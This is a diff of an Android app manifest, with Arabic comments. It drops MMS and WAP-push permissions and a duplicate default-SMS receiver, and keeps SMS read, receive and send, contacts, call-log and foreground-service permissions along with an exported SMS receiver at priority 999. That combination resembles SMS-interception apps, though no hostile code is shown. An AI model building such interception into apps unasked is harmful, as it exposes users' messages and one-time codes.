@@ -4,8 +4,6 @@
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
-    <uses-permission android:name="android.permission.RECEIVE_MMS" />
-    <uses-permission android:name="android.permission.RECEIVE_WAP_PUSH" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
@@ -48,16 +46,10 @@
             </intent-filter>
         </service>
 
+        <!-- رجعناها زي الأول عشان البناء ينجح -->
         <receiver android:name=".SmsReceiver" android:exported="true">
             <intent-filter android:priority="999">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
-            </intent-filter>
-        </receiver>
-        
-        <!-- عشان يقدر يبقى تطبيق الرسايل الافتراضي -->
-        <receiver android:name=".SmsReceiver" android:exported="true">
-            <intent-filter>
-                <action android:name="android.provider.Telephony.SMS_DELIVER" />
             </intent-filter>
         </receiver>
     </application>
